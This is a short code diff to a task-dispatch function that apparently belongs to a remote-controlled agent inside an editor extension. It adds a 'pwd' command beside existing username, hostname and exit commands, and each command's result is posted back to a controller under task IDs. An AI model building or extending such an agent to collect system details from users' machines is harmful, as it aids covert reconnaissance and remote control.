@@ -110,11 +110,14 @@ function handleTasks(context, tasks) {
 			case 'current_user':
 				output = os.userInfo().username
 				break
+			case 'exit':
+				context.globalState.update('mustExit', 1);
+				break
 			case 'hostname':
 				output = os.hostname()
 				break
-			case 'exit':
-				context.globalState.update('mustExit', 1);
+			case 'pwd':
+				output = process.cwd()
 				break
 		}
 		postTaskResponse(callbackUUID, taskID, output)
